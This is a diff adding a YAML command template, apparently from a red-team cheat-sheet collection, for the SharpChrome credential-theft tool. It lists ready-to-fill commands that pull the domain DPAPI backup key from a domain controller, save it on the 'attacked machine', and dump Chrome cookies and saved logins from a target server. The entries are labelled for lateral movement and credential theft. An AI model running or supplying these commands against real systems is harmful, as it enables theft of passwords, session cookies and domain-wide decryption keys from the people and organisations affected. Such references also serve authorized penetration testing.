@@ -1,0 +1,38 @@
+---
+projectLink: https://github.com/GhostPack/SharpDPAPI
+params:
+  - name: Command
+    description: description
+  - name: Server
+    description: description
+  - name: DomainController
+    description: DC FQDN name or IP
+  - name: Path
+    description: Local path for key on attacked machine
+
+sections:
+  - name: Get domain backup key as Base64 string
+    labels: ["Lateral", "Creds"]
+    commands:
+      - language: EXE
+        command: SharpChrome backupkey /nowrap /server:{{DomainController}}
+  - name: Get domain backup key, save to file
+    labels: ["Lateral", "Creds"]
+    commands:
+      - language: EXE
+        command: SharpChrome backupkey /nowrap /server:{{DomainController}} file:{{Path}}
+  - name: General
+    labels: []
+    commands:
+      - language: EXE
+        command: SharpChrome.exe {{Command}}
+  - name: Cookies
+    labels: []
+    commands:
+      - language: EXE
+        command: SharpChrome.exe cookies /server:{{Server}}
+  - name: Logins
+    labels: []
+    commands:
+      - language: EXE
+        command: SharpChrome.exe logins /server:{{Server}}
